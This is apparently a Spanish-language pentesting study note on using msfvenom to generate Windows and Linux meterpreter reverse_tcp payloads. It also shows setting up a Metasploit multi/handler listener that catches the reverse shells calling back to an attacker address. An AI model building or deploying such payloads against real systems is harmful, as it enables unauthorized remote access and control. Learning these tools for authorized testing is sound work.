1. Generating Payloads With Msfvenom

Utilizaremos el Msfvenom para la generacion de payloads, malicious meterpreter paylod. 
Es una combianacion de 2 utilidades 1 - msfpayload 2- msfencode

Generar Payloads. 
Nos envocaremos en   windows/x64/meterpreter/reverse_tcp   payload

Para diferencia los payload los que son stage tienen la estructura siguiente

Stage-Payload  Se encuentran dentro de meterpreter
windows/x64/meterpreter/reverse_tcp

linux/x86/meterpreter/reverse_tcp

Non-Stage-Payload
windows/x64/meterpreter_bind_tcp  

linux/x86/meterpreter_reverse_tcp


```
$ msfvenom --list payloads   #Listar los payloads existentes

#Crear un payload

kaliakali:~$ msfvenom -a x86|x64 -p payload LHOST=MI_HOST LPORT=MI_PORT -f exe > DIR_SALIDA
-f -> formato de salida
-a -> especifica la arquitectura aunque no es necesario

EXAMPLE 1
kaliakali:~$ msfvenom -a x86 -p windows/meterpreter/reverse_tcp LHOST=10.10.10.5 LPORT=1234 -f exe > /home/kali/Desktop/Windows_Payloads/payloadx86.exe

EXAMPLE 2
kaliakali:~$ msfvenom windows/x64/meterpreter/reverse_tcp LHOST=10.10.10.5 LPORT=1234 -f exe > /home/kali/Desktop/Windows_Payloads/payloadx86.exe
```

Para ver la lista de formatos de salida

```
 $ msfvenom --list formats
```


Crear un payload para Linux

```
kaliakali:~$msfvenom -p Linux/x86/meterpreter/reverse_tcp LHOST=10.10.10.5 LPORT=1234 -f elf > ~/Desktop/Linux_Payloads/payloadx86
kaliakali:~$chmod +x payloadx86   #Darle permisos de ejecucion 
kaliakali:~$./payloadx86          #Ejecutar el payload
```

Luego este archivo lo intentaremos subir a la maquina objetivo para establecer la coneccion con nuestra maquina pero antes debemo establecer en manejador (handler).

Establecer el manejador 
```
mfsconsole
msf6 > use exploit/multi/handler 
[*] Using configured payload generic/shell_reverse_tcp
msf6 exploit(multi/handler) > set payload windows/meterpreter/reverse_tcp
payload => windows/meterpreter/reverse_tcp
msf6 exploit(multi/handler) > show options
msf6 exploit(multi/handler) > set LHOST ip
msf6 exploit(multi/handler) > set LPORT port
msf6 exploit(multi/handler) > run

 
```
